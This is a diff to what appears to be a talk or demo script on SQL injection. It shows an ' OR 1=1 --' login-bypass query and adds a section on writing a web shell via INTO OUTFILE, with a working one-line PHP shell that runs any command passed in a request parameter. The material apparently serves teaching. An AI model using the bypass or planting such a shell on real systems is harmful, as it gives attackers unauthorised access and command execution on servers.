@@ -126,3 +126,17 @@ SELECT * FROM users WHERE username='' OR 1=1 --' AND password='<pass>'
 We are in! It seems to say we are "admin" too, result!
 
 Demo over. *Back to slides. 
+
+## Web shell via "INTO OUTFILE"
+
+
+
+Simplest single line web shell I care to use:
+
+```php
+<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
+```
+
+Sauce: https://gist.github.com/sente/4dbb2b7bdda2647ba80b
+
+a
